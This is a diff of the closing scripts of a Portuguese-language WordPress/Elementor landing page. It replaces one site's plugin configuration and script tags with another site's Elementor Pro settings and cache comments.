-var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Partilhar no Facebook","shareOnTwitter":"Partilhar no Twitter","pinIt":"Fix\u00e1-lo","download":"Download","downloadImage":"Descarregar Imagem","fullscreen":"\u00c9cr\u00e3 Inteiro","zoom":"Zoom","share":"Partilhar","playVideo":"Reproduzir v\u00eddeo","previous":"Anterior","next":"Seguinte","close":"Fechar","a11yCarouselPrevSlideMessage":"Previous slide","a11yCarouselNextSlideMessage":"Next slide","a11yCarouselFirstSlideMessage":"This is the first slide","a11yCarouselLastSlideMessage":"This is the last slide","a11yCarouselPaginationBulletMessage":"Go to slide"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobile ao alto","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile ao baixo","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet Portrait","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Landscape","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Port\u00e1til","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Widescreen","value":2400,"default_value":2400,"direction":"min","is_enabled":false}},"hasCustomBreakpoints":false},"version":"3.30.4","is_static":false,"experimentalFeatures":{"e_font_icon_svg":true,"additional_custom_breakpoints":true,"container":true,"e_optimized_markup":true,"nested-elements":true,"e_element_cache":true,"home_screen":true,"global_classes_should_enforce_capabilities":true,"cloud-library":true,"e_opt_in_v4_page":true},"urls":{"assets":"https:\/\/novociclo.online\/programa\/wp-content\/plugins\/elementor\/assets\/","ajaxurl":"https:\/\/novociclo.online\/programa\/wp-admin\/admin-ajax.php","uploadUrl":"http:\/\/novociclo.online\/programa\/wp-content\/uploads"},"nonces":{"floatingButtonsClickTracking":"f5b194c36d"},"swiperClass":"swiper","settings":{"page":[],"editorPreferences":[]},"kit":{"active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description"},"post":{"id":322,"title":"PAG%20%E2%80%93%2002%20%E2%80%93%20Programa","excerpt":"","featuredImage":false}};
+var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Compartilhar no Facebook","shareOnTwitter":"Compartilhar no Twitter","pinIt":"Fixar","download":"Baixar","downloadImage":"Baixar imagem","fullscreen":"Tela cheia","zoom":"Zoom","share":"Compartilhar","playVideo":"Reproduzir v\u00eddeo","previous":"Anterior","next":"Pr\u00f3ximo","close":"Fechar","a11yCarouselPrevSlideMessage":"Slide anterior","a11yCarouselNextSlideMessage":"Pr\u00f3ximo slide","a11yCarouselFirstSlideMessage":"Este \u00e9 o primeiro slide","a11yCarouselLastSlideMessage":"Este \u00e9 o \u00faltimo slide","a11yCarouselPaginationBulletMessage":"Ir para o slide"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Dispositivos m\u00f3veis no modo retrato","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Dispositivos m\u00f3veis no modo paisagem","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet no modo retrato","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet no modo paisagem","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Notebook","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Tela ampla (widescreen)","value":2400,"default_value":2400,"direction":"min","is_enabled":false}},"hasCustomBreakpoints":false},"version":"3.30.4","is_static":false,"experimentalFeatures":{"e_font_icon_svg":true,"additional_custom_breakpoints":true,"container":true,"theme_builder_v2":true,"nested-elements":true,"e_element_cache":true,"home_screen":true,"global_classes_should_enforce_capabilities":true,"cloud-library":true,"e_opt_in_v4_page":true},"urls":{"assets":"https:\/\/novaestrategia.shop\/wp-content\/plugins\/elementor\/assets\/","ajaxurl":"https:\/\/novaestrategia.shop\/wp-admin\/admin-ajax.php","uploadUrl":"https:\/\/novaestrategia.shop\/wp-content\/uploads"},"nonces":{"floatingButtonsClickTracking":"756ca178ba"},"swiperClass":"swiper","settings":{"page":[],"editorPreferences":[]},"kit":{"active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description"},"post":{"id":393,"title":"truque-1%20%E2%80%93%20novaestrategia.shop","excerpt":"","featuredImage":false}};
 </script>
-<script src="js/frontend.min.js" id="elementor-frontend-js"></script>
-<script src="js/plugins.js" id="master-addons-plugins-js"></script>
-<script id="master-addons-scripts-js-extra">
-var jltma_scripts = {"plugin_url":"https:\/\/novociclo.online\/programa\/wp-content\/plugins\/master-addons","ajaxurl":"https:\/\/novociclo.online\/programa\/wp-admin\/admin-ajax.php","nonce":"master-addons-elementor"};
-var jltma_data_table_vars = {"lengthMenu":"Display _MENU_ records per page","zeroRecords":"Nothing found - sorry","info":"Showing page _PAGE_ of _PAGES_","infoEmpty":"No records available","infoFiltered":"(filtered from _MAX_ total records)","searchPlaceholder":"Search...","processing":"Processing...","csvHtml5":"CSV","excelHtml5":"Excel","pdfHtml5":"PDF","print":"Print"};
-var jltma_scripts = {"plugin_url":"https:\/\/novociclo.online\/programa\/wp-content\/plugins\/master-addons","ajaxurl":"https:\/\/novociclo.online\/programa\/wp-admin\/admin-ajax.php","nonce":"master-addons-elementor"};
-var jltma_data_table_vars = {"lengthMenu":"Display _MENU_ records per page","zeroRecords":"Nothing found - sorry","info":"Showing page _PAGE_ of _PAGES_","infoEmpty":"No records available","infoFiltered":"(filtered from _MAX_ total records)","searchPlaceholder":"Search...","processing":"Processing...","csvHtml5":"CSV","excelHtml5":"Excel","pdfHtml5":"PDF","print":"Print"};
-</script>
-<script src="js/master-addons-scripts.js" id="master-addons-scripts-js"></script>
-<script id="eael-general-js-extra">
-var localize = {"ajaxurl":"https:\/\/novociclo.online\/programa\/wp-admin\/admin-ajax.php","nonce":"a65b09f3e7","i18n":{"added":"Added ","compare":"Compare","loading":"Loading..."},"eael_translate_text":{"required_text":"is a required field","invalid_text":"Invalid","billing_text":"Billing","shipping_text":"Shipping","fg_mfp_counter_text":"of"},"page_permalink":"https:\/\/novociclo.online\/programa\/pag-02\/","cart_redirectition":"","cart_page_url":"","el_breakpoints":{"mobile":{"label":"Mobile ao alto","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile ao baixo","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet Portrait","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Landscape","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Port\u00e1til","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Widescreen","value":2400,"default_value":2400,"direction":"min","is_enabled":false}}};
-</script>
-<script src="js/general.min.js" id="eael-general-js"></script>
+<script src="js/frontend.min_1.js" id="elementor-frontend-js"></script>
+<script src="js/webpack-pro.runtime.min.js" id="elementor-pro-webpack-runtime-js"></script>
 <script src="js/hooks.min.js" id="wp-hooks-js"></script>
 <script src="js/i18n.min.js" id="wp-i18n-js"></script>
 <script id="wp-i18n-js-after">
 wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
 </script>
-<script src="js/elementor.js" id="qi-addons-for-elementor-elementor-js"></script>
-<script src="js/purify.min.js" id="purify-js"></script>
-<script id="editor-css-script-js-extra">
-var modelData = {"postID":"322","breakpoints":{"tablet":768,"mobile":425}};
+<script id="elementor-pro-frontend-js-before">
+var ElementorProFrontendConfig = {"ajaxurl":"https:\/\/novaestrategia.shop\/wp-admin\/admin-ajax.php","nonce":"54fb22dd8a","urls":{"assets":"https:\/\/novaestrategia.shop\/wp-content\/plugins\/elementor-pro\/assets\/","rest":"https:\/\/novaestrategia.shop\/wp-json\/"},"settings":{"lazy_load_background_images":true},"popup":{"hasPopUps":false},"shareButtonsNetworks":{"facebook":{"title":"Facebook","has_counter":true},"twitter":{"title":"Twitter"},"linkedin":{"title":"LinkedIn","has_counter":true},"pinterest":{"title":"Pinterest","has_counter":true},"reddit":{"title":"Reddit","has_counter":true},"vk":{"title":"VK","has_counter":true},"odnoklassniki":{"title":"OK","has_counter":true},"tumblr":{"title":"Tumblr"},"digg":{"title":"Digg"},"skype":{"title":"Skype"},"stumbleupon":{"title":"StumbleUpon","has_counter":true},"mix":{"title":"Mix"},"telegram":{"title":"Telegram"},"pocket":{"title":"Pocket","has_counter":true},"xing":{"title":"XING","has_counter":true},"whatsapp":{"title":"WhatsApp"},"email":{"title":"Email"},"print":{"title":"Print"},"x-twitter":{"title":"X"},"threads":{"title":"Threads"}},"facebook_sdk":{"lang":"pt_BR","app_id":""},"lottie":{"defaultAnimationUrl":"https:\/\/novaestrategia.shop\/wp-content\/plugins\/elementor-pro\/modules\/lottie\/assets\/animations\/default.json"}};
 </script>
-<script src="js/editor-css-script.js" id="editor-css-script-js"></script>
-	
+<script src="js/frontend.min.js" id="elementor-pro-frontend-js"></script>
+<script src="js/elements-handlers.min.js" id="pro-elements-handlers-js"></script>
+			<script data-category="functional">
+											</script>
+				
 
 
 
-</body></html><!-- Page cached by LiteSpeed Cache 7.6.2 on 2025-11-20 16:39:35 -->
+</body></html><!-- Page cached by LiteSpeed Cache 7.6.2 on 2025-12-06 21:41:51 -->
